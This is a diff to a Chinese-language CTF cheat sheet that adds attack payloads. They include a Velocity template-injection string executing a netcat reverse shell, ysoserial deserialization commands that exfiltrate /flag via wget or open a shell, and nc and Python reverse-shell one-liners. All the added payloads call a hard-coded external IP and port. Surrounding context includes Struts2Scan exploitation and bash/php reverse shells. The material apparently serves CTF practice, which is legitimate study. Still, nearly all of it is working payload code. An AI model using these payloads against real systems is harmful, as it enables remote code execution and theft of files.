@@ -3385,14 +3385,39 @@ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin
 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec
 ```
 
+#### Velocity 模板注入
+
+- 注入的时候记得 urlencode
+
+##### poc 举例
+
+`/ssti` 是 Web 路径，`template` 是 GET 参数，根据具体的题目不同更改
+
+```bash
+/ssti?template=#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("nc 144.34.181.239 10008 -e /bin/sh")
+```
+
 #### ysoserial
 
+- 推荐使用 shell 反弹，因为靶机中未必有 wget 或 curl，不一定能数据外带
+- 打的时候记得 urlencode
+
 打反序列化工具
+
+该文件的参数（如 `CommonsCollections2`），在不知道漏洞的情况下，需要自己一个一个试
 
 ##### 数据外带
 
 ```bash
 java -jar ysoserial-all.jar CommonsCollections6 "wget --post-file=/flag 144.34.181.239:10008" | base64 -w0
+```
+
+##### shell 反弹
+
+nc 反弹:
+
+```bash
+java -jar ysoserial.jar CommonsCollections2 "nc 144.34.181.239 10008 -e /bin/sh "|base64 -w0
 ```
 
 `CommonsCollections6` 这里可以自己试，输入 `java -jar ysoserial-all.jar` 查看所有 Payload
@@ -3533,14 +3558,28 @@ bash -i >& /dev/tcp/ip/port 0>&1
 
 **nc反弹**
 
+因为靶机中未必有 bash，可以尝试反弹 sh
+
 ```bash
 mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f
+```
+
+如果该命令不行，尝试以下命令
+
+```bash
+nc 144.34.181.239 10008 -e /bin/sh
 ```
 
 **php反弹**
 
 ```bash
  php -r '$sock=fsockopen(ip,port);exec("/bin/bash -i <&3 >&3 2>&3");'
+```
+
+**Python反弹**
+
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("144.34.181.239",10008));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 ## 常用软件的 RCE 漏洞 (围绕蚁剑)
